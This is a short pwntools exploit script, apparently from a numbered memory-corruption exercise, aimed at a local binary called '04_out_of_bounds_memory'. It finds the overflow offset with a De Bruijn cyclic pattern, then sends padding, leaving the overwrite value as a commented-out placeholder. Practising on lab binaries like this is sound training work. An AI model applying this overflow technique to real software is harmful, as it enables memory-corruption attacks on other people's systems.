#!/usr/bin/env python2
from pwn import *

def calculate_offset():
    io = process('./04_out_of_bounds_memory')
    log.info('Skipping prompt')
    io.readuntil('input:')

    log.info('Sending De Bruijn sequence')
    io.sendline(cyclic(100))
    io.readuntil(': ')

    target = io.readline()
    target = target.rstrip() # Trim trailing newline
    log.info("Our target value is corrupted to be: {}".format(target))

    target = int(target, 16)
    distance = cyclic_find(target)
    log.info("The target is {} bytes into our overflow".format(distance))

    return distance

def exploit(distance):
    io = process('./04_out_of_bounds_memory')

    payload = 'A' * distance
    # payload += '????'

    log.info('Skipping prompt')
    io.readuntil('input:')

    log.info('Sending payload')
    io.sendline(payload)

    io.interactive()

if __name__ == '__main__':
    offset = calculate_offset()
    exploit(offset)
